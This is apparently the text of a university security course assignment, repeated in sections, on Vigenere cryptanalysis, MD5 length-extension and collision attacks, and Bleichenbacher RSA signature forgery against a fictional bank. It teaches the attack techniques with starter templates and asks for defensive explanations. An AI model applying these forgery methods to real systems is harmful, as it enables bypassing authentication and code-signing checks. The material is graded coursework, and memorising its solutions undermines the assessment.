pymd5 module here and learn how to use it by running pydoc pymd5 . To follow along with these examples, run Python in interactive mode and run the command from pymd5 import md5, padding . Consider the string \"Use HMAC, not hashes\". We can compute its MD5 hash by running: from pymd5 import md5 , padding m = \"Use HMAC, not hashes\" h = md5 () h . update ( m ) print ( h . hexdigest ()) or, more compactly, print ( md5 ( m ) . hexdigest ()) The output should be 3ecc68efa1871751ea9b0b1a5b25004d . MD5 processes messages in 512-bit blocks, so internally, the hash function pads m to a multiple of that length. The padding consists of the bit 1, followed by as many 0 bits as necessary, followed by a 64-bit count of the number of bits in the unpadded message. (If the 1 and the count won't fit in the current block, an additional block is added.) You can use the function padding(count) in the pymd5 module to compute the padding that will be added to a count -bit message. Even if we didn't know m , we could compute the hash of longer messages of the general form m + padding(len(m)*8) + suffix by setting the initial internal state of our MD5 function to MD5(m) , instead of the default initialization value, and setting the function's message length counter to the size of m plus the padding (a multiple of the block size). To find the padded message length, guess the length of m and run bits = (length_of_m + len(padding(length_of_m * 8))) * 8 . The pymd5 module lets you specify these parameters as additional arguments to the md5 object: h = md5 ( state = codecs . decode ( \"3ecc68efa1871751ea9b0b1a5b25004d\" , \"hex\" ), count = 512 ) Now you can use length extension to find the hash of a longer string that appends the suffix \"Good advice\". Simply run: x = \"Good advice\" h . update ( x ) print ( h . hexdigest ()) to execute the compression function over x and output the resulting hash. Verify that it equals the MD5 hash of m + padding(len(m)*8) + x . Notice that, due to the length-extension property of MD5, we didn't need to know the value of m to compute the hash of the longer string - all we needed to know was m 's length and its MD5 hash. This part of the assignment is intended to introduce length extension and familiarize you with the Python MD5 module we will be using; you will not need to submit anything for it. 2b. Conduct a length extension attack \u00b6 Length extension attacks can cause serious vulnerabilities when people mistakenly try to construct something like an HMAC by using hash(secret || message) . The National Bank of CSE 127, which is not up-to-date on its security practices, hosts an API that allows its client-side applications to perform actions on behalf of a user by loading URLs of the form: http://bank.cse127.ucsd.edu/pa6/api?token=d6613c382dbb78b5592091e08f6f41fe&user=nadiah&command1=ListSquirrels&command2=NoOp where token is MD5( user's 8-character password || user=... [the rest of the decoded URL starting from user= and ending with the last command] ). Using the techniques that you learned in the previous section and without guessing the password, apply length extension to create a URL ending with &command3=UnlockAllSafes that would be treated as valid by the server API. Note : Because of its bad security practices, the National Bank of CSE 127 has taken down its website. So you'll have to use gradescope to test if your attack URL would work. Hint : You might want to use the quote() function from Python's urllib.parse module to encode non-ASCII characters in the URL. Historical fact : In 2009, security researchers found that the API used by the photo-sharing site Flickr suffered from a length-extension vulnerability almost exactly like the one in this exercise. What to submit A Python 3.x script named len_ext_attack.py that: Accepts a valid URL in the same form as the one above as a command line argument. Modifies the URL so that it will execute the UnlockAllSafes command as the user. Prints the new URL to the command line. You should make the following assumptions: The input URL will have the same form as the sample above, but we may change the server hostname and the values of token , user , command1 , and command2 . These values may be of substantially different lengths than in the sample. The input URL may be for a user with a different password, but the length of the password will be unchanged. You can base your code on the following example: import sys , urllib.parse from pymd5 import md5 , padding url = sys . argv [ 1 ] # Your code to modify url goes here print ( new_url ) Part 3: MD5 collisions \u00b6 MD5 was once the most widely used cryptographic hash function, but today it is considered dangerously insecure. This is because cryptanalysts have discovered efficient algorithms for finding collisions ---pairs of messages with the same MD5 hash value. The first known collisions were announced on August 17, 2004 by Xiaoyun Wang, Dengguo Feng, Xuejia Lai, and Hongbo Yu. Here's one pair of colliding messages they published: Message 1: d131dd02c5e6eec4693d9a0698aff95c 2fcab58712467eab4004583eb8fb7f89 55ad340609f4b30283e488832571415a 085125e8f7cdc99fd91dbdf280373c5b d8823e3156348f5bae6dacd436c919c6 dd53e2b487da03fd02396306d248cda0 e99f33420f577ee8ce54b67080a80d1e c69821bcb6a8839396f9652b6ff72a70 Message 2: d131dd02c5e6eec4693d9a0698aff95c 2fcab50712467eab4004583eb8fb7f89 55ad340609f4b30283e4888325f1415a 085125e8f7cdc99fd91dbd7280373c5b d8823e3156348f5bae6dacd436c919c6 dd53e23487da03fd02396306d248cda0 e99f33420f577ee8ce54b67080280d1e c69821bcb6a8839396f965ab6ff72a70 Copy the above hex strings into file1.hex and file2.hex. Convert each group of hex strings into a binary file. (On Linux, run xxd -r -p file.hex > file .) What are the MD5 hashes of the two binary files? Verify that they're the same. ( openssl dgst -md5 file1 file2 ) What are their SHA-256 hashes? Verify that they're different. ( openssl dgst -sha256 file1 file2 ) You don't need to submit anything for the above questions. 3a. Generating collisions yourself \u00b6 In 2004, Wang's method took more than 5 hours to find a collision on a desktop PC. Since then, researchers have introduced vastly more efficient collision finding algorithms. You can compute your own MD5 collisions using a tool written by Marc Stevens that uses a more advanced technique. You can download the fastcoll tool here: http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip (Windows executable) or http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5-1_source.zip (source code) If you are compiling fastcoll from source, you can compile using this makefile . You will also need to have installed the Boost libraries. On Ubuntu, you can install using apt-get install libboost-all-dev . On OS X, you can install Boost via the Homebrew package manager using brew install boost . Generate your own collision with this tool. How long did it take? ( time ./fastcoll -o file1 file2 ) What are your files? To get a hex dump, run xxd -p file . What are their MD5 hashes? Verify that they're the same. What are their SHA-256 hashes? Verify that they're different. What to submit Write your answers in writeup.txt . This file will also be used for part 5. 3b. A hash collision attack \u00b6 The collision attack lets us generate two messages with the same MD5 hash and any chosen (identical) prefix. Due to MD5's length-extension behavior, we can append any suffix to both messages and know that the longer messages will also collide. This lets us construct files that differ only in a binary \"blob\" in the middle and have the same MD5 hash, i.e. prefix || blobA || suffix and prefix || blobB || suffix . We can leverage this to create two programs (shell scripts) that have identical MD5 hashes but wildly different behaviors. We're using shell scripts, but this could be done using a program in almost any language. Put the following two lines into a file called prefix : 1 2 #!/bin/bash cat << \"EOF\" | openssl dgst -sha256 > DIGEST and put these four lines (starting with a blank line) into a file called suffix : EOF digest=$(cat DIGEST | sed 's/(stdin)= //' ) echo \"The sha256 digest is $digest\" Now use fastcoll to generate two files with the same MD5 hash that both begin with prefix . ( fastcoll -p prefix -o col1 col2 .) Then append the suffix to both ( cat col1 suffix > file1.sh; cat col2 suffix > file2.sh ). Verify that file1.sh and file2.sh have the same MD5 hash but generate different output. Extend this technique to produce another pair of programs, good and evil , that also share the same MD5 hash. One program should execute a benign payload: echo or print \"I mean no harm.\" The second should execute a pretend malicious payload: echo or print \"You are doomed!\" What to submit Two scripts, good and evil , that have the same MD5 hash, have different SHA-256 hashes, and print the specified messages. Part 4: RSA signature forgery \u00b6 A secure implementation of RSA encryption or digital signatures requires a proper padding scheme. RSA without padding, also known as textbook RSA , has several undesirable properties. For example, it is trivial for an attacker with only an RSA public key pair (n,e) to produce a mathematically valid message, signature pair by choosing an s and returning (s^e, s) . In order to prevent an attacker from being able to forge valid signatures in this way, RSA implementations use a padding scheme to provide structure to the messages that are encrypted or signed. The most commonly used padding scheme in practice is defined by the PKCS #1 v1.5 standard, which can be found at https://tools.ietf.org/html/rfc2313 . The standard defines, among other things, the format of RSA keys and signatures and the procedures for generating and validating RSA signatures. 4a. Validating RSA signatures \u00b6 You can experiment with validating RSA signatures yourself. Create a file called key.pub that contains the following RSA public key: -----BEGIN PUBLIC KEY----- MFowDQYJKoZIhvcNAQEBBQADSQAwRgJBALB8X0rLPrfgAfXMW73LjKYb5V9QG5LU DrmsA9CAittsLvh2c082wHwVyCIiWQ8S3AA/jfW839sFN4zAZkW2S3cCAQM= -----END PUBLIC KEY----- You can view the modulus and public exponent of this key by running: openssl rsa -in key.pub -pubin -text -noout Create a file containing only the text CSE 127 rul3z! . echo -n 'CSE 127 rul3z!' > message The following is a base64-encoded signature of the file message using the public key above. RaHHC2E0qm1sauuhlV3KBGiaTb5IGmaaNFQn22ykTSu88EIBkBG48gjiamc3l+4HJYUwpZDefcT2 dLPyaOHA/w== Convert this signature into a binary file: base64 -d -i sig.b64 > sig Now verify the signature against the file you created. openssl dgst -sha1 -verify key.pub -signature sig message We can also use basic math operations in Python to explore this signature further. Remember, RSA ciphertexts, plaintexts, exponents, moduli, and signatures are actually all integers. Open a Python shell and run the following commands to import the signature as an integer: from Crypto.PublicKey import RSA from Crypto.Hash import SHA signature = int ( open ( 'sig' , 'rb' ) . read () . hex (), 16 ) Next, import the public key file that you created earlier: pubkey = RSA . importKey ( open ( 'key.pub' ) . read ()) The modulus and exponent are then accessible as pubkey.n and pubkey.e , respectively. Now reverse the signing operation and examine the resulting value in hex: \" {:0128x} \" . format ( pow ( signature , pubkey . e , pubkey . n )) You should see something like '0001fffff ... 22c1422dac3c4e5fdd87040b3fb156acd3d83d1f' Verify that the last 20 bytes of this value match the SHA-1 hash of your file: SHA . new ( b \"CSE 127 rul3z!\" ) . hexdigest () You don't need to submit anything for this part. 4b. PKCS #1 v1.5 signature padding \u00b6 The signed value you examined in the previous section had been padded using the PKCS #1 v1.5 signature scheme. PKCS #1 v1.5 padding for RSA signatures is structured as follows: one 00 byte, one 01 byte, some FF bytes, another 00 byte, some special ASN.1 bytes denoting which hash algorithm was used to compute the hash digest, then the bytes of the hash digest itself. The number of FF bytes varies such that the size of m is equal to the size of the RSA key. A k -bit RSA key used to sign a SHA-1 hash digest will generate the following padded value of m : 00 01 FF...FF 00 3021300906052B0E03021A05000414 XX...XX ^^^^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ^^^^^^^ k/8 - 38 bytes wide || 20-byte SHA-1 digest ASN.1 \"magic\" bytes When PKCS padding is used, it is important for implementations to verify that every bit of the padded, signed message is exactly as it should be. It is tempting for an implementer to validate the signature by first stripping off the 00 01 bytes, then some number of padding FF bytes, then 00 , and then parse the ASN.1 and verify the hash. If the implementation does not check the length of the FF bytes and that the hash is in the least significant bits of the message, then it is possible for an attacker to forge values that pass this validation check. This possibility is particularly troubling for signatures generated with e = 3 . If the length of the required padding, ASN.1 bytes, and hash value is significantly less than n^{1/3} then an attacker can construct a cube root over the integers whose most significant bits will validate as a correct signature, ignoring the actual key. To construct a \"signature\" that will validate against such implementations, an attacker simply needs to construct an integer whose most significant bytes have the correct format, including the hashed message, pad the remainder of this value with zeros or other garbage that will be ignored by the vulnerable implementation, and then take a cube root over the integers, rounding as appropriate. 4c. Constructing forged signatures \u00b6 The National Bank of CSE 127 has a website that its employees use to initiate wire transfers between bank accounts. To authenticate each transfer request, the control panel requires a signature from a particular 2048-bit RSA key: -----BEGIN PUBLIC KEY----- MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEArBOrcgTp5r77Uz5CV1HX 9w19lmmkMqlh81paBr4SvrkTqXTmevSlRQE5pSJ7Y3rz7I4HbdVpYq16nlaF9TIj ig5i1SzNMe4Uo+Plv/O5kYYZOM3Do69E8dujOqgoxwPxaAqRwA411k5egJd8VhJ+ n6zilsTZ5QroSP/LEzKDku3OnXZKxzDKmdzs/nS4aHBK89b5IqwHOQFSbQA0tlkJ 1BmFvGKc3WUfVk0KgdeS/b3zMX8OdKJxtJWYAo7BfJlxFU81/Gl1XEqr8dWUqZ7J 8WaQ2fiBmoHSIOd5sQ9K6g3+tfeHfnvV8vkrqV1J9jAp6yirGCbyuy+jrUac5CJg zwIBAw== -----END PUBLIC KEY----- Unfortunately, this control panel is running old software that has not been patched to fix the signature forgery vulnerability. Using the signature forgery technique described above, produce an RSA signature that validates against the National Bank of CSE 127 site. Historical fact: This attack was discovered by Daniel Bleichenbacher, who presented it in a lightning talk at the rump session at the Crypto 2006 conference. His talk is described in this mailing list posting: https://www.ietf.org/mail-archive/web/openpgp/current/msg00999.html . At the time, many important implementations of RSA signatures were discovered to be vulnerable to this attack, including OpenSSL. In 2014, the Mozilla library NSS was found to be vulnerable to this type of attack: https://www.mozilla.org/security/advisories/mfsa2014-73/ . What to submit A Python 3.x script called bleichenbacher.py that: Accepts a double-quoted string as command-line argument. Prints a base64-encoded forged signature of the input string. We have provided a Python library, roots.py , that provides several useful functions that you may wish to use when implementing your solution. You can download the library here . Your program may assume that PyCrypto and roots.py are available, and may use standard Python libraries, but should otherwise be self-contained. In order to use these functions, you will have to import roots.py . You may wish to use the following template: from Crypto.PublicKey import RSA from Crypto.Hash import SHA from roots import * import sys message = sys . argv [ 1 ] # Your code to forge a signature goes here. # some example functions from roots root , is_exact = integer_nthroot ( 27 , 3 ) print ( integer_to_base64 ( root )) 5. Writeup \u00b6 With reference to the construction of HMAC, explain how changing the design of the API in 2b to use token=HMAC(_user's password_)(user=...) would avoid the length extension vulnerability. Briefly explain why the technique you explored in 3b poses a danger to systems that rely on digital signatures to verify the integrity of programs before they are installed or executed. Examples include Microsoft Authenticode and most Linux package managers. (Assume that these systems sign MD5 hashes of the programs.) Since 2010, NIST has specified that RSA public exponents must be at least 2^16 + 1. Briefly explain why Bleichenbacher's attack would not work for these keys. What to submit Write your answers in writeup.txt . Submission Checklist \u00b6 Submit the following to gradescope: vigenere.key to Assignment 6 vigenere key (for part 1) good and evil to Assignment 6 hash collision (for part 3) len_ext_attack.py to Assignment 6 length extension (for part 2) bleichenbacher.py to Assignment 6 signature forgery (for part 4) writeup.txt to Assignment 6 writeup (with answers to parts 3a and 5)","title":"Assignment 6"},{"location":"pa/pa6/#assignment-6","text":"Deadline Friday, March 13, 2020 by 23:59:59 Early Turn-In: Wednesday, March 11, 2020 by 23:59:59","title":"Assignment 6"},{"location":"pa/pa6/#overview","text":"In this project, we'll start by investigating Vigenere ciphers, then move on to investigating vulnerabilities in widely used cryptographic hash functions, including length-extension attacks and collision vulnerabilities, and an implementation vulnerability in a popular digital signature scheme.","title":"Overview"},{"location":"pa/pa6/#part-1-vigenere-ciphers","text":"For this problem, solve by hand or write a program (perhaps in Python). You can read about how the Vigenere cipher works on Wikipedia . Vigenere ciphers can be generally deciphered using Kasiski Examination, which is discussed on the wikipedia page. You can find some ciphertext produced with the Vigenere cipher under a certain key on Gradescope as the assignment \"Assignment 6 ciphertext\". Assume that encrypting the letter A with the key results in no change, encrypting the letter B results in an increment by one place in the alphabet, encrypting C resulting in an increment by two places, etc. Also assume that the original plaintext contains only uppercase letters (A-Z) and no spaces or punctuation. What is the key? What to submit A text file named vigenere.key containing your key. Historical note : This November, it was discovered that the security company Fortinet was using \"XOR encryption with a static key\" in some products, which is similar to a Vigenere cipher and has similar (lack of) security properties. https://seclists.org/bugtraq/2019/Nov/38","title":"Part 1: Vigenere ciphers"},{"location":"pa/pa6/#part-2-length-extension","text":"In most applications, you should use MACs such as HMAC-SHA256 instead of plain cryptographic hash functions (e.g., MD5, SHA-1, or SHA-256) because hashes, also known as digests, fail to match our intuitive security expectations. What we really want is something that behaves like a pseudorandom function, which HMACs seem to approximate and hash functions do not. One difference between hash functions and pseudorandom functions is that many hashes are subject to length extension . Many common hash functions use a design called the Merkle-Damgard construction. Each is built around a compression function f and maintains an internal state s , which is initialized to a fixed constant. Messages are processed in fixed-size blocks by applying the compression function to the current state and current block to compute an updated internal state, i.e., s_{i+1} = f(s_i, b_i). The result of the final application of the compression function becomes the output of the hash function. A consequence of this design is that if we know the hash of an n -block message, we can find the hash of longer messages by applying the compression function for each block b_{n+1}, b_{n+2}, ... that we want to add. This process is called length extension, and it can be used to attack many applications of hash functions.","title":"Part 2: Length extension"},{"location":"pa/pa6/#2a-experimenting","text":"To experiment with this idea, we'll use a Python implementation of the MD5 hash function, though SHA-1 and SHA-256 are vulnerable to length extension in the same way. You can download the pymd5 module here and learn how to use it by running pydoc pymd5 . To follow along with these examples, run Python in interactive mode and run the command from pymd5 import md5, padding . Consider the string \"Use HMAC, not hashes\". We can compute its MD5 hash by running: from pymd5 import md5 , padding m = \"Use HMAC, not hashes\" h = md5 () h . update ( m ) print ( h . hexdigest ()) or, more compactly, print ( md5 ( m ) . hexdigest ()) The output should be 3ecc68efa1871751ea9b0b1a5b25004d . MD5 processes messages in 512-bit blocks, so internally, the hash function pads m to a multiple of that length. The padding consists of the bit 1, followed by as many 0 bits as necessary, followed by a 64-bit count of the number of bits in the unpadded message. (If the 1 and the count won't fit in the current block, an additional block is added.) You can use the function padding(count) in the pymd5 module to compute the padding that will be added to a count -bit message. Even if we didn't know m , we could compute the hash of longer messages of the general form m + padding(len(m)*8) + suffix by setting the initial internal state of our MD5 function to MD5(m) , instead of the default initialization value, and setting the function's message length counter to the size of m plus the padding (a multiple of the block size). To find the padded message length, guess the length of m and run bits = (length_of_m + len(padding(length_of_m * 8))) * 8 . The pymd5 module lets you specify these parameters as additional arguments to the md5 object: h = md5 ( state = codecs . decode ( \"3ecc68efa1871751ea9b0b1a5b25004d\" , \"hex\" ), count = 512 ) Now you can use length extension to find the hash of a longer string that appends the suffix \"Good advice\". Simply run: x = \"Good advice\" h . update ( x ) print ( h . hexdigest ()) to execute the compression function over x and output the resulting hash. Verify that it equals the MD5 hash of m + padding(len(m)*8) + x . Notice that, due to the length-extension property of MD5, we didn't need to know the value of m to compute the hash of the longer string - all we needed to know was m 's length and its MD5 hash. This part of the assignment is intended to introduce length extension and familiarize you with the Python MD5 module we will be using; you will not need to submit anything for it.","title":"2a. Experimenting"},{"location":"pa/pa6/#2b-conduct-a-length-extension-attack","text":"Length extension attacks can cause serious vulnerabilities when people mistakenly try to construct something like an HMAC by using hash(secret || message) . The National Bank of CSE 127, which is not up-to-date on its security practices, hosts an API that allows its client-side applications to perform actions on behalf of a user by loading URLs of the form: http://bank.cse127.ucsd.edu/pa6/api?token=d6613c382dbb78b5592091e08f6f41fe&user=nadiah&command1=ListSquirrels&command2=NoOp where token is MD5( user's 8-character password || user=... [the rest of the decoded URL starting from user= and ending with the last command] ). Using the techniques that you learned in the previous section and without guessing the password, apply length extension to create a URL ending with &command3=UnlockAllSafes that would be treated as valid by the server API. Note : Because of its bad security practices, the National Bank of CSE 127 has taken down its website. So you'll have to use gradescope to test if your attack URL would work. Hint : You might want to use the quote() function from Python's urllib.parse module to encode non-ASCII characters in the URL. Historical fact : In 2009, security researchers found that the API used by the photo-sharing site Flickr suffered from a length-extension vulnerability almost exactly like the one in this exercise. What to submit A Python 3.x script named len_ext_attack.py that: Accepts a valid URL in the same form as the one above as a command line argument. Modifies the URL so that it will execute the UnlockAllSafes command as the user. Prints the new URL to the command line. You should make the following assumptions: The input URL will have the same form as the sample above, but we may change the server hostname and the values of token , user , command1 , and command2 . These values may be of substantially different lengths than in the sample. The input URL may be for a user with a different password, but the length of the password will be unchanged. You can base your code on the following example: import sys , urllib.parse from pymd5 import md5 , padding url = sys . argv [ 1 ] # Your code to modify url goes here print ( new_url )","title":"2b. Conduct a length extension attack"},{"location":"pa/pa6/#part-3-md5-collisions","text":"MD5 was once the most widely used cryptographic hash function, but today it is considered dangerously insecure. This is because cryptanalysts have discovered efficient algorithms for finding collisions ---pairs of messages with the same MD5 hash value. The first known collisions were announced on August 17, 2004 by Xiaoyun Wang, Dengguo Feng, Xuejia Lai, and Hongbo Yu. Here's one pair of colliding messages they published: Message 1: d131dd02c5e6eec4693d9a0698aff95c 2fcab58712467eab4004583eb8fb7f89 55ad340609f4b30283e488832571415a 085125e8f7cdc99fd91dbdf280373c5b d8823e3156348f5bae6dacd436c919c6 dd53e2b487da03fd02396306d248cda0 e99f33420f577ee8ce54b67080a80d1e c69821bcb6a8839396f9652b6ff72a70 Message 2: d131dd02c5e6eec4693d9a0698aff95c 2fcab50712467eab4004583eb8fb7f89 55ad340609f4b30283e4888325f1415a 085125e8f7cdc99fd91dbd7280373c5b d8823e3156348f5bae6dacd436c919c6 dd53e23487da03fd02396306d248cda0 e99f33420f577ee8ce54b67080280d1e c69821bcb6a8839396f965ab6ff72a70 Copy the above hex strings into file1.hex and file2.hex. Convert each group of hex strings into a binary file. (On Linux, run xxd -r -p file.hex > file .) What are the MD5 hashes of the two binary files? Verify that they're the same. ( openssl dgst -md5 file1 file2 ) What are their SHA-256 hashes? Verify that they're different. ( openssl dgst -sha256 file1 file2 ) You don't need to submit anything for the above questions.","title":"Part 3: MD5 collisions"},{"location":"pa/pa6/#3a-generating-collisions-yourself","text":"In 2004, Wang's method took more than 5 hours to find a collision on a desktop PC. Since then, researchers have introduced vastly more efficient collision finding algorithms. You can compute your own MD5 collisions using a tool written by Marc Stevens that uses a more advanced technique. You can download the fastcoll tool here: http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip (Windows executable) or http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5-1_source.zip (source code) If you are compiling fastcoll from source, you can compile using this makefile . You will also need to have installed the Boost libraries. On Ubuntu, you can install using apt-get install libboost-all-dev . On OS X, you can install Boost via the Homebrew package manager using brew install boost . Generate your own collision with this tool. How long did it take? ( time ./fastcoll -o file1 file2 ) What are your files? To get a hex dump, run xxd -p file . What are their MD5 hashes? Verify that they're the same. What are their SHA-256 hashes? Verify that they're different. What to submit Write your answers in writeup.txt . This file will also be used for part 5.","title":"3a. Generating collisions yourself"},{"location":"pa/pa6/#3b-a-hash-collision-attack","text":"The collision attack lets us generate two messages with the same MD5 hash and any chosen (identical) prefix. Due to MD5's length-extension behavior, we can append any suffix to both messages and know that the longer messages will also collide. This lets us construct files that differ only in a binary \"blob\" in the middle and have the same MD5 hash, i.e. prefix || blobA || suffix and prefix || blobB || suffix . We can leverage this to create two programs (shell scripts) that have identical MD5 hashes but wildly different behaviors. We're using shell scripts, but this could be done using a program in almost any language. Put the following two lines into a file called prefix : 1 2 #!/bin/bash cat << \"EOF\" | openssl dgst -sha256 > DIGEST and put these four lines (starting with a blank line) into a file called suffix : EOF digest=$(cat DIGEST | sed 's/(stdin)= //' ) echo \"The sha256 digest is $digest\" Now use fastcoll to generate two files with the same MD5 hash that both begin with prefix . ( fastcoll -p prefix -o col1 col2 .) Then append the suffix to both ( cat col1 suffix > file1.sh; cat col2 suffix > file2.sh ). Verify that file1.sh and file2.sh have the same MD5 hash but generate different output. Extend this technique to produce another pair of programs, good and evil , that also share the same MD5 hash. One program should execute a benign payload: echo or print \"I mean no harm.\" The second should execute a pretend malicious payload: echo or print \"You are doomed!\" What to submit Two scripts, good and evil , that have the same MD5 hash, have different SHA-256 hashes, and print the specified messages.","title":"3b. A hash collision attack"},{"location":"pa/pa6/#part-4-rsa-signature-forgery","text":"A secure implementation of RSA encryption or digital signatures requires a proper padding scheme. RSA without padding, also known as textbook RSA , has several undesirable properties. For example, it is trivial for an attacker with only an RSA public key pair (n,e) to produce a mathematically valid message, signature pair by choosing an s and returning (s^e, s) . In order to prevent an attacker from being able to forge valid signatures in this way, RSA implementations use a padding scheme to provide structure to the messages that are encrypted or signed. The most commonly used padding scheme in practice is defined by the PKCS #1 v1.5 standard, which can be found at https://tools.ietf.org/html/rfc2313 . The standard defines, among other things, the format of RSA keys and signatures and the procedures for generating and validating RSA signatures.","title":"Part 4: RSA signature forgery"},{"location":"pa/pa6/#4a-validating-rsa-signatures","text":"You can experiment with validating RSA signatures yourself. Create a file called key.pub that contains the following RSA public key: -----BEGIN PUBLIC KEY----- MFowDQYJKoZIhvcNAQEBBQADSQAwRgJBALB8X0rLPrfgAfXMW73LjKYb5V9QG5LU DrmsA9CAittsLvh2c082wHwVyCIiWQ8S3AA/jfW839sFN4zAZkW2S3cCAQM= -----END PUBLIC KEY----- You can view the modulus and public exponent of this key by running: openssl rsa -in key.pub -pubin -text -noout Create a file containing only the text CSE 127 rul3z! . echo -n 'CSE 127 rul3z!' > message The following is a base64-encoded signature of the file message using the public key above. RaHHC2E0qm1sauuhlV3KBGiaTb5IGmaaNFQn22ykTSu88EIBkBG48gjiamc3l+4HJYUwpZDefcT2 dLPyaOHA/w== Convert this signature into a binary file: base64 -d -i sig.b64 > sig Now verify the signature against the file you created. openssl dgst -sha1 -verify key.pub -signature sig message We can also use basic math operations in Python to explore this signature further. Remember, RSA ciphertexts, plaintexts, exponents, moduli, and signatures are actually all integers. Open a Python shell and run the following commands to import the signature as an integer: from Crypto.PublicKey import RSA from Crypto.Hash import SHA signature = int ( open ( 'sig' , 'rb' ) . read () . hex (), 16 ) Next, import the public key file that you created earlier: pubkey = RSA . importKey ( open ( 'key.pub' ) . read ()) The modulus and exponent are then accessible as pubkey.n and pubkey.e , respectively. Now reverse the signing operation and examine the resulting value in hex: \" {:0128x} \" . format ( pow ( signature , pubkey . e , pubkey . n )) You should see something like '0001fffff ... 22c1422dac3c4e5fdd87040b3fb156acd3d83d1f' Verify that the last 20 bytes of this value match the SHA-1 hash of your file: SHA . new ( b \"CSE 127 rul3z!\" ) . hexdigest () You don't need to submit anything for this part.","title":"4a. Validating RSA signatures"},{"location":"pa/pa6/#4b-pkcs-1-v15-signature-padding","text":"The signed value you examined in the previous section had been padded using the PKCS #1 v1.5 signature scheme. PKCS #1 v1.5 padding for RSA signatures is structured as follows: one 00 byte, one 01 byte, some FF bytes, another 00 byte, some special ASN.1 bytes denoting which hash algorithm was used to compute the hash digest, then the bytes of the hash digest itself. The number of FF bytes varies such that the size of m is equal to the size of the RSA key. A k -bit RSA key used to sign a SHA-1 hash digest will generate the following padded value of m : 00 01 FF...FF 00 3021300906052B0E03021A05000414 XX...XX ^^^^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ^^^^^^^ k/8 - 38 bytes wide || 20-byte SHA-1 digest ASN.1 \"magic\" bytes When PKCS padding is used, it is important for implementations to verify that every bit of the padded, signed message is exactly as it should be. It is tempting for an implementer to validate the signature by first stripping off the 00 01 bytes, then some number of padding FF bytes, then 00 , and then parse the ASN.1 and verify the hash. If the implementation does not check the length of the FF bytes and that the hash is in the least significant bits of the message, then it is possible for an attacker to forge values that pass this validation check. This possibility is particularly troubling for signatures generated with e = 3 . If the length of the required padding, ASN.1 bytes, and hash value is significantly less than n^{1/3} then an attacker can construct a cube root over the integers whose most significant bits will validate as a correct signature, ignoring the actual key. To construct a \"signature\" that will validate against such implementations, an attacker simply needs to construct an integer whose most significant bytes have the correct format, including the hashed message, pad the remainder of this value with zeros or other garbage that will be ignored by the vulnerable implementation, and then take a cube root over the integers, rounding as appropriate.","title":"4b. PKCS #1 v1.5 signature padding"},{"location":"pa/pa6/#4c-constructing-forged-signatures","text":"The National Bank of CSE 127 has a website that its employees use to initiate wire transfers between bank accounts. To authenticate each transfer request, the control panel requires a signature from a particular 2048-bit RSA key: -----BEGIN PUBLIC KEY----- MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEArBOrcgTp5r77Uz5CV1HX 9w19lmmkMqlh81paBr4SvrkTqXTmevSlRQE5pSJ7Y3rz7I4HbdVpYq16nlaF9TIj ig5i1SzNMe4Uo+Plv/O5kYYZOM3Do69E8dujOqgoxwPxaAqRwA411k5egJd8VhJ+ n6zilsTZ5QroSP/LEzKDku3OnXZKxzDKmdzs/nS4aHBK89b5IqwHOQFSbQA0tlkJ 1BmFvGKc3WUfVk0KgdeS/b3zMX8OdKJxtJWYAo7BfJlxFU81/Gl1XEqr8dWUqZ7J 8WaQ2fiBmoHSIOd5sQ9K6g3+tfeHfnvV8vkrqV1J9jAp6yirGCbyuy+jrUac5CJg zwIBAw== -----END PUBLIC KEY----- Unfortunately, this control panel is running old software that has not been patched to fix the signature forgery vulnerability. Using the signature forgery technique described above, produce an RSA signature that validates against the National Bank of CSE 127 site. Historical fact: This attack was discovered by Daniel Bleichenbacher, who presented it in a lightning talk at the rump session at the Crypto 2006 conference. His talk is described in this mailing list posting: https://www.ietf.org/mail-archive/web/openpgp/current/msg00999.html . At the time, many important implementations of RSA signatures were discovered to be vulnerable to this attack, including OpenSSL. In 2014, the Mozilla library NSS was found to be vulnerable to this type of attack: https://www.mozilla.org/security/advisories/mfsa2014-73/ . What to submit A Python 3.x script called bleichenbacher.py that: Accepts a double-quoted string as command-line argument. Prints a base64-encoded forged signature of the input string. We have provided a Python library, roots.py , that provides several useful functions that you may wish to use when implementing your solution. You can download the library here . Your program may assume that PyCrypto and roots.py are available, and may use standard Python libraries, but should otherwise be self-contained. In order to use these functions, you will have to import roots.py . You may wish to use the following template: from Crypto.PublicKey import RSA from Crypto.Hash import SHA from roots import * import sys message = sys . argv [ 1 ] # Your code to forge a signature goes here. # some example functions from roots root , is_exact = integer_nthroot ( 27 , 3 ) print ( integer_to_base64 ( root ))","title":"4c. Constructing forged signatures"},{"location":"pa/pa6/#5-writeup","text":"With reference to the construction of HMAC, explain how changing the design of the API in 2b to use token=HMAC(_user's password_)(user=...) would avoid the length extension vulnerability. Briefly explain why the technique you explored in 3b poses a danger to systems that rely on digital signatures to verify the integrity of programs before they are installed or executed. Examples include Microsoft Authenticode and most Linux package managers. (Assume that these systems sign MD5 hashes of the programs.) Since 2010, NIST has specified that RSA public exponents must be at least 2^16 + 1. Briefly explain why Bleichenbacher's attack would not work for these keys. What to submit Write your answers in writeup.txt .","title":"5. Writeup"},{"location":"pa/pa6/#submission-checklist","text":"Submit the following to gradescope: vigenere.key to Assignment 6 vigenere key (for part 1) good and evil to Assignment 6 hash collision (for part 3) len_ext_attack.py to Assignment 6 length extension (for part 2) bleichenbacher.py to Assignment 6 signature forgery (for part 4) writeup.txt to Assignment 6 writeup (with answers to parts 3a and 5)","title":"Submission Checklist"}]}